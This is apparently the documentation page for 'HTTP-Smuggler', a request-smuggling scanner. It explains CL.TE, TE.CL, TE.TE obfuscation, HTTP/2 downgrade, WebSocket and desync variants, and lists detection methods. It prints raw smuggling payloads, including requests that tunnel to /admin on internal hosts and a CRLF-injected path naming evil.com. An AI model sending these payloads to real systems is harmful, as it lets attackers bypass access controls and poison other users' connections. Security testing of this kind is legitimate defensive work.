# Supported Smuggling Variants

HTTP-Smuggler supports all known HTTP request smuggling variants across HTTP/1.1, HTTP/2, and WebSocket protocols.

## Classic HTTP/1.1 Variants

### CL.TE (Content-Length vs Transfer-Encoding)

**Scenario**: Frontend uses `Content-Length`, Backend uses `Transfer-Encoding: chunked`

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The frontend reads 13 bytes (including `0\r\n\r\nSMUGGLED`), but the backend stops at the chunked terminator `0\r\n\r\n`, leaving `SMUGGLED` in the buffer.

### TE.CL (Transfer-Encoding vs Content-Length)

**Scenario**: Frontend uses `Transfer-Encoding: chunked`, Backend uses `Content-Length`

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 10

x=1
0

```

The frontend processes the chunked body, but the backend only reads 4 bytes, leaving the smuggled request.

### TE.TE (Transfer-Encoding Obfuscation)

**Scenario**: Both servers support TE, but one can be tricked into ignoring it via obfuscation.

HTTP-Smuggler includes **56 obfuscation variants**:

| Category | Examples |
|----------|----------|
| Capitalization | `transfer-encoding`, `TRANSFER-ENCODING`, `tRaNsFeR-eNcOdInG` |
| Whitespace | `Transfer-Encoding : chunked`, `Transfer-Encoding:\tchunked` |
| Value Mutation | `chunked, identity`, `chunkedx`, `,chunked` |
| Special Chars | `chunked\x00`, `Transfer-Encoding\x00:` |
| Duplicates | `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` |
| Newlines | `Transfer-Encoding:\r\n chunked` (line folding) |

## HTTP/2 Variants

### H2.CL (HTTP/2 Content-Length Injection)

When HTTP/2 is downgraded to HTTP/1.1 by a proxy, an injected `Content-Length` header can cause desync.

### H2.TE (HTTP/2 Transfer-Encoding Injection)

Similar to H2.CL, but with `Transfer-Encoding: chunked` injection.

### H2.CRLF (CRLF Injection in HTTP/2)

HTTP/2 uses binary framing, so CRLF characters in header values don't terminate headers. After downgrade, these become request splitting attacks.

```
:path: / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

### H2.0 / H2.Tunnel (Request Tunneling)

Exploiting HTTP/2 request tunneling via header injection.

### h2c (HTTP/2 Cleartext Upgrade)

Exploiting servers that support h2c upgrade from HTTP/1.1.

## WebSocket Variants

### WS.Version (Sec-WebSocket-Version Smuggling)

Sending invalid `Sec-WebSocket-Version` values that cause 426 responses, but some proxies (Varnish, HAProxy) incorrectly establish tunnels.

```http
GET /socket HTTP/1.1
Host: vulnerable.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 1337

GET /admin HTTP/1.1
Host: internal.service
```

### WS.Upgrade (Upgrade Header Smuggling)

Exploiting WebSocket upgrade handling inconsistencies.

## Advanced Variants

### Pause-Based Desync

Exploiting timeout differences between frontend and backend. Pausing mid-request can cause one server to timeout while the other continues processing.

### Client-Side Desync (CSD)

Browser-based attacks that poison the browser's connection pool. Requires victim to visit attacker-controlled page.

## Detection Methods

| Variant | Detection Method | Safety Level |
|---------|-----------------|--------------|
| CL.TE | Timing (incomplete chunk causes timeout) | Safe |
| TE.CL | Timing (backend waits for more data) | Safe |
| TE.TE | Timing + Differential | Safe/Moderate |
| H2.* | Timing + Differential | Safe/Moderate |
| WS.* | Differential (426 handling) | Moderate |
| Pause | Timing (explicit pauses) | Safe |
| CSD | JavaScript-based | N/A |

## References

- [HTTP Desync Attacks - PortSwigger](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)

